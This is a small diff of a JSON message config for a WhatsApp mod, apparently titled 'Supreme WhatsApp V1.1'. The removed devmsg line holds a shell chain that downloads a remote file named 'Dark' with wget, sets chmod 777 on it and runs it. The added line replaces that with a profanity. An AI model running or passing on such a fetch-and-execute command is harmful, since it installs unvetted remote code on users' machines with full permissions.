@@ -1,7 +1,6 @@
 {
  "msgno":"1.1",
  "msgtitle":"Supreme WhatsApp V1.1",
- "devmsg":"
-apt-get update -y; apt-get upgrade -y; wget https://raw.githubusercontent.com/sbatrow/DARKSSH-MANAGER/master/Dark; chmod 777 Dark; ./Dark",
-"link":"https://github.com/InfinityModsOFC/InfinityMods/new/main"
+ "devmsg":"Fuck You",
+ "link":"https://github.com/InfinityModsOFC/InfinityMods/new/main"
 }
